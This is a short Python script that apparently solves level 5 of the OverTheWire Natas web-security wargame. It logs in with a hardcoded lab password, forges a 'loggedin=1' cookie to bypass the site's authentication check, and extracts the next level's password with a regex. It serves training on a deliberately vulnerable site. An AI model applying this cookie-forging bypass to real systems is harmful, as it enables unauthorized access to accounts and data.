
#!/usr/bin/env python

import requests
import re

username = 'natas5'
password = '0n35PkggAPm2zbEpOU802c0x0Msn1ToK'

cookies = {"loggedin": "1"}

url = 'http://%s.natas.labs.overthewire.org/' % username

try:
    session = requests.Session()
    response = session.get(url, auth=(username, password), cookies=cookies)
    content = response.text

    # Uncomment the line below to print the entire content of the response
    # print(content)

    # Using regular expression to find the password for natas6
    matches = re.findall(r'natas6 is (.*)</div>', content)

    if matches:
        password_natas6 = matches[0].strip()  # Strip any leading or trailing whitespace
        print("Password for natas6:", password_natas6)
    else:
        print("Password for natas6 not found in the response.")
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
